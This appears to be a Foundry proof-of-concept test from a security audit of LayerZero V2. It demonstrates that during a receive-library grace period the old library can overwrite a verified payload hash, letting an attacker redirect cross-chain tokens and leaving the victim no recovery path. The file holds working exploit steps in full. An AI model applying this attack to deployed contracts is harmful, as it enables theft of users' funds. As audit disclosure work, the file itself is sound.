// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Origin } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
import { Errors } from "@layerzerolabs/lz-evm-protocol-v2/contracts/libs/Errors.sol";

import { ReceiveUln302 } from "../../contracts/uln/uln302/ReceiveUln302.sol";
import { UlnConfig, SetDefaultUlnConfigParam } from "../../contracts/uln/UlnBase.sol";
import { DVN } from "../../contracts/uln/dvn/DVN.sol";
import { DVNFeeLib } from "../../contracts/uln/dvn/DVNFeeLib.sol";
import { IDVN } from "../../contracts/uln/interfaces/IDVN.sol";

import { PacketUtil } from "../util/Packet.sol";
import { AuditBase } from "./AuditBase.t.sol";
import { MockToken, MockOFTReceiver } from "./mocks/AuditMocks.sol";

// ========================= PoC Test =========================

/// @title AV9 - Grace Period Fund Theft via Payload Overwrite
///
/// @notice CRITICAL severity finding.
///
/// Root cause chain:
///   1. During a receive-library upgrade that uses a grace period,
///      MessageLibManager.isValidReceiveLibrary() accepts BOTH the old and the new library.
///   2. EndpointV2.verify() allows re-verification of a nonce that has been verified but not yet
///      executed (verified by _verifiable: nonce's payloadHash != EMPTY_PAYLOAD_HASH).
///   3. MessagingChannel._inbound() (line 45) unconditionally overwrites inboundPayloadHash[...][nonce].
///
/// Attack flow:
///   A. Legitimate cross-chain token transfer is verified by the NEW library; the correct
///      payloadHash (funds to victim) is stored.
///   B. Attacker calls the OLD library's verify + commitVerification with the SAME nonce but a
///      crafted message that redirects tokens to the attacker. The old library is still valid, so
///      EndpointV2.verify() accepts it and _inbound() silently overwrites the stored hash.
///   C. Any attempt to execute the legitimate message now reverts with PayloadHashNotFound.
///   D. The attacker's message executes successfully, draining the OFT receiver.
///   E. nilify / burn do not help the victim because the original hash is permanently destroyed.
contract GracePeriodFundTheftTest is AuditBase {

    MockToken internal token;
    MockOFTReceiver internal oftReceiver;
    ReceiveUln302 internal newReceiveUln;
    DVN internal newDvn;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");
    uint256 internal constant TRANSFER_AMOUNT = 100_000e18;

    function setUp() public override {
        super.setUp();

        // Deploy ERC20 and OFT receiver
        token = new MockToken();
        oftReceiver = new MockOFTReceiver(address(dstEndpoint), address(token));

        // Fund the OFT receiver so it can pay out cross-chain transfers
        token.transfer(address(oftReceiver), TRANSFER_AMOUNT);

        // Deploy the upgraded receive library and register it
        newReceiveUln = new ReceiveUln302(address(dstEndpoint));
        dstEndpoint.registerLibrary(address(newReceiveUln));

        // Deploy a DVN authorised to submit verifications to the new library
        address[] memory libs = new address[](4);
        libs[0] = address(0);
        libs[1] = address(0);
        libs[2] = address(0);
        libs[3] = address(newReceiveUln);
        address[] memory signers = new address[](1);
        signers[0] = address(this);
        address[] memory admins = new address[](1);
        admins[0] = address(this);

        newDvn = new DVN(DST_EID, DST_EID, libs, address(dstFixture.priceFeed), signers, 1, admins);

        IDVN.DstConfigParam[] memory dstConfigParams = new IDVN.DstConfigParam[](1);
        dstConfigParams[0] = IDVN.DstConfigParam({ dstEid: DST_EID, gas: 5000, multiplierBps: 0, floorMarginUSD: 0 });
        newDvn.setDstConfig(dstConfigParams);

        DVNFeeLib newDvnFeeLib = new DVNFeeLib(DST_EID, 1e18);
        newDvn.setWorkerFeeLib(address(newDvnFeeLib));

        // Configure the new receive library's ULN to require our new DVN
        address[] memory dvns = new address[](1);
        dvns[0] = address(newDvn);
        UlnConfig memory ulnConfig = UlnConfig(1, uint8(dvns.length), 0, 0, dvns, new address[](0));
        SetDefaultUlnConfigParam[] memory ulnConfigParams = new SetDefaultUlnConfigParam[](1);
        ulnConfigParams[0] = SetDefaultUlnConfigParam(SRC_EID, ulnConfig);
        newReceiveUln.setDefaultUlnConfigs(ulnConfigParams);
    }

    // ========================= AV9.1: Full Fund Theft PoC =========================

    /// @notice CRITICAL: Demonstrates end-to-end theft of tokens held by a MockOFT receiver.
    ///
    /// Preconditions
    ///   - oftReceiver holds TRANSFER_AMOUNT tokens.
    ///   - The destination endpoint is mid-upgrade: both old and new receive libraries are valid.
    ///
    /// Steps
    ///   1. New library verifies the legitimate packet (victim receives tokens).
    ///   2. Old library re-verifies the same nonce with a payload that sends tokens to the attacker.
    ///   3. Legitimate execution reverts (hash mismatch).
    ///   4. Attacker's execution succeeds; tokens are transferred to the attacker.
    function test_CRITICAL_GracePeriodFundTheft() public {
        // --- Setup: activate grace period so both libraries are valid ---
        uint256 gracePeriod = 100; // blocks
        dstEndpoint.setDefaultReceiveLibrary(SRC_EID, address(newReceiveUln), gracePeriod);

        // Sanity-check: both libraries must be valid for the exploit to apply.
        assertTrue(
            dstEndpoint.isValidReceiveLibrary(address(oftReceiver), SRC_EID, address(dstReceiveUln)),
            "OLD library must be valid during grace period"
        );
        assertTrue(
            dstEndpoint.isValidReceiveLibrary(address(oftReceiver), SRC_EID, address(newReceiveUln)),
            "NEW library must be valid during grace period"
        );

        // --- Step 1: Legitimate packet verified by the new library ---
        //
        // The message encodes (victim, TRANSFER_AMOUNT): if executed it sends tokens to the victim.
        bytes memory legitimateMessage = abi.encode(victim, TRANSFER_AMOUNT);
        Packet memory legitimatePacket = _makePacket(1, address(this), address(oftReceiver), legitimateMessage);

        (, bytes memory header, , bytes32 legitimatePayloadHash) = _encodeAndSplit(legitimatePacket);

        vm.prank(address(newDvn));
        newReceiveUln.verify(header, legitimatePayloadHash, 1);
        newReceiveUln.commitVerification(header, legitimatePayloadHash);

        bytes32 storedHash = dstEndpoint.inboundPayloadHash(
            address(oftReceiver),
            SRC_EID,
            bytes32(uint256(uint160(address(this)))),
            1
        );
        assertEq(storedHash, legitimatePayloadHash, "Legitimate hash must be stored after new-lib verification");

        // --- Step 2: Attacker overwrites the payload via the old library ---
        //
        // The malicious message encodes (attacker, TRANSFER_AMOUNT): redirects the funds.
        // The header is identical (same nonce / sender / receiver), so commitVerification routes
        // to the same slot in inboundPayloadHash and silently overwrites it.
        bytes memory maliciousMessage = abi.encode(attacker, TRANSFER_AMOUNT);
        Packet memory maliciousPacket = _makePacket(1, address(this), address(oftReceiver), maliciousMessage);

        (, , , bytes32 maliciousPayloadHash) = _encodeAndSplit(maliciousPacket);

        // Old DVN verifies via the OLD library (still valid during grace period).
        _dvnVerify(dstDvn, dstReceiveUln, header, maliciousPayloadHash, 1);
        // commitVerification calls EndpointV2.verify() which calls _inbound() and overwrites the slot.
        _commitVerification(dstReceiveUln, header, maliciousPayloadHash);

        bytes32 storedHashAfterOverwrite = dstEndpoint.inboundPayloadHash(
            address(oftReceiver),
            SRC_EID,
            bytes32(uint256(uint160(address(this)))),
            1
        );
        assertEq(
            storedHashAfterOverwrite,
            maliciousPayloadHash,
            "CRITICAL: old library overwrote the new library's verified payload"
        );
        assertTrue(storedHashAfterOverwrite != legitimatePayloadHash, "Legitimate hash is gone");

        // The guid is deterministic from (nonce, srcEid, sender, dstEid, receiver) — both packets share it.
        assertEq(legitimatePacket.guid, maliciousPacket.guid, "Both packets must share the same guid");

        // --- Step 3: Legitimate execution is permanently blocked ---
        //
        // The stored hash is now the malicious one, so supplying the legitimate message triggers
        // PayloadHashNotFound inside _clearPayload.
        Origin memory origin = Origin({
            srcEid: SRC_EID,
            sender: bytes32(uint256(uint160(address(this)))),
            nonce: 1
        });

        // The stored hash is maliciousPayloadHash; the actual hash will be keccak256(guid ++ legitimateMessage).
        bytes32 actualLegitHash = keccak256(abi.encodePacked(legitimatePacket.guid, legitimateMessage));
        vm.expectRevert(abi.encodeWithSelector(Errors.LZ_PayloadHashNotFound.selector, maliciousPayloadHash, actualLegitHash));
        dstEndpoint.lzReceive(origin, address(oftReceiver), legitimatePacket.guid, legitimateMessage, "");

        // Confirm the victim received nothing.
        assertEq(token.balanceOf(victim), 0, "Victim must have received nothing");

        // --- Step 4: Attacker executes the crafted message and steals the tokens ---
        //
        // The guid is the same for both packets (it depends only on the header fields).
        // The stored hash matches keccak256(abi.encodePacked(guid, maliciousMessage)), so
        // _clearPayload succeeds and lzReceive transfers tokens to the attacker.
        dstEndpoint.lzReceive(origin, address(oftReceiver), maliciousPacket.guid, maliciousMessage, "");

        assertEq(token.balanceOf(attacker), TRANSFER_AMOUNT, "Attacker must have stolen all tokens");
        assertEq(token.balanceOf(victim), 0, "Victim received nothing");
        assertEq(token.balanceOf(address(oftReceiver)), 0, "OFT receiver is drained");
    }

    // ========================= AV9.2: Victim Cannot Recover =========================

    /// @notice Demonstrates that nilify and burn cannot help the victim recover funds.
    ///
    /// Once the attacker overwrites the payload hash:
    ///   - The original legitimate hash is gone from storage.
    ///   - nilify(maliciousHash) blocks attacker but does NOT restore victim's hash.
    ///   - burn() reverts because lazyInboundNonce has not advanced.
    ///   - Neither operation can restore the original payload hash.
    function test_CRITICAL_VictimCannotRecover() public {
        // --- Reproduce the overwrite (same as AV9.1 up to the overwrite step) ---
        dstEndpoint.setDefaultReceiveLibrary(SRC_EID, address(newReceiveUln), 100);

        bytes memory legitMsg = abi.encode(victim, TRANSFER_AMOUNT);
        bytes memory malMsg = abi.encode(attacker, TRANSFER_AMOUNT);
        Packet memory legitPkt = _makePacket(1, address(this), address(oftReceiver), legitMsg);
        Packet memory malPkt = _makePacket(1, address(this), address(oftReceiver), malMsg);

        (, bytes memory header, , bytes32 legitHash) = _encodeAndSplit(legitPkt);
        (, , , bytes32 malHash) = _encodeAndSplit(malPkt);

        // New library verifies legitimate, then old library overwrites with malicious
        vm.prank(address(newDvn));
        newReceiveUln.verify(header, legitHash, 1);
        newReceiveUln.commitVerification(header, legitHash);
        _dvnVerify(dstDvn, dstReceiveUln, header, malHash, 1);
        _commitVerification(dstReceiveUln, header, malHash);

        bytes32 senderBytes = bytes32(uint256(uint160(address(this))));
        assertEq(
            dstEndpoint.inboundPayloadHash(address(oftReceiver), SRC_EID, senderBytes, 1),
            malHash,
            "Precondition: overwrite must have happened"
        );

        // --- Recovery attempt 1: nilify the malicious hash ---
        vm.prank(address(oftReceiver));
        dstEndpoint.nilify(address(oftReceiver), SRC_EID, senderBytes, 1, malHash);
        assertEq(
            dstEndpoint.inboundPayloadHash(address(oftReceiver), SRC_EID, senderBytes, 1),
            bytes32(type(uint256).max),
            "Slot set to NIL after nilify"
        );

        // Both legitimate and malicious execution fail against NIL — victim has no funds.
        _assertLzReceiveReverts(legitPkt.guid, legitMsg);
        _assertLzReceiveReverts(malPkt.guid, malMsg);
        assertEq(token.balanceOf(victim), 0, "Victim still has no tokens even after nilify");
        assertEq(token.balanceOf(attacker), 0, "Attacker blocked by nilify");

        // --- Recovery attempt 2: burn reverts (lazyInboundNonce == 0) ---
        // Re-verify so burn's hash-match check can pass, then show burn still reverts.
        vm.prank(address(newDvn));
        newReceiveUln.verify(header, legitHash, 1);
        newReceiveUln.commitVerification(header, legitHash);

        vm.prank(address(oftReceiver));
        vm.expectRevert(abi.encodeWithSelector(Errors.LZ_InvalidNonce.selector, uint64(1)));
        dstEndpoint.burn(address(oftReceiver), SRC_EID, senderBytes, 1, legitHash);

        assertEq(token.balanceOf(victim), 0, "Victim has no recovery path");
    }

    /// @dev Helper to assert lzReceive reverts for a given guid + message (reduces stack depth).
    function _assertLzReceiveReverts(bytes32 guid, bytes memory message) internal {
        bytes32 senderBytes = bytes32(uint256(uint160(address(this))));
        Origin memory origin = Origin({ srcEid: SRC_EID, sender: senderBytes, nonce: 1 });
        bytes32 nilHash = bytes32(type(uint256).max);
        bytes32 actualHash = keccak256(abi.encodePacked(guid, message));
        vm.expectRevert(abi.encodeWithSelector(Errors.LZ_PayloadHashNotFound.selector, nilHash, actualHash));
        dstEndpoint.lzReceive(origin, address(oftReceiver), guid, message, "");
    }
}
